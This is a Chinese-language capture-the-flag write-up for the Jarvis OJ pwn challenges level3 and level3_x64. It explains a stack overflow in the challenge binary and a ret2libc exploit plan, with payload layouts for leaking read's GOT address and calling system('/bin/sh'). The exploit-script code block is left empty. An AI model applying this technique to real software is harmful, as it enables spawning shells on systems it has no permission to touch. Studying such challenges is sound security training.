# Jarvisoj--pwn--level3&level3_x64

32位和64位思路一样，我们用64位来玩

checksec一下

打开ida查看一波

```c++
int __cdecl main(int argc, const char **argv, const char **envp)
{
  vulnerable_function();
  return write(1, "Hello, World!\n", 0xEuLL);
}
```

进入vulnerable_function

```c++
ssize_t vulnerable_function()
{
  char buf; // [rsp+0h] [rbp-80h]

  write(1, "Input:\n", 7uLL);
  return read(0, &buf, 0x200uLL);
}
```

此处存在栈溢出。

## 利用思路

利用write函数把got表中read函数的地址暴露出来，配合libc文件求偏移值，然后把system和‘/bin/sh’的真实地址求出，利用read函数把system("/bin/sh") 写进栈的返回地址。

### 第一步 求read函数的地址

```
0000000000000080 buf             db ?
-000000000000007F                 db ? ; undefined
-000000000000007E                 db ? ; undefined
.....................................
-0000000000000002                 db ? ; undefined
-0000000000000001                 db ? ; undefined
+0000000000000000  s              db 8 dup(?)
+0000000000000008  r              db 8 dup(?)
+0000000000000010
+0000000000000010 ; end of stack variables
```

可见我们要构造的payload = ’a' * (0x80 + 8) + rdi + p64(1) + rsi,r15 + read_got + p64(8) + write_plt + vulnerable_function

(32位  则不需要rdi rsi

​	payload = ’a' * (0x88 + 4) + write_plt + vulnerable_function + p32(1) + p32(read_got) + p32(4)

)

利用ROPgadget 找到 rdi 和 rsi r15的地址

```
rdi
```



### 第二步 利用libc偏移求出system 和 '/bin/sh' 的地址

libc相关函数和字符串地址

```
libc
```

求出read的地址后，与libc文件里的read地址相减得出 偏移值

offset = read_adr - read_libc

system_adr = system_libc + offset

bin_adr = bin_sh_libc + offset

### 第三步 构造payload并写进栈

payload = ’a' * (0x80 + 8) + rdi + bin_adr  + system_adr + vulnerable_function

(32位

  payload = ’a' * (0x88 + 4) + system_adr + vulnerable_function + bin_adr

)

exp:

```

```

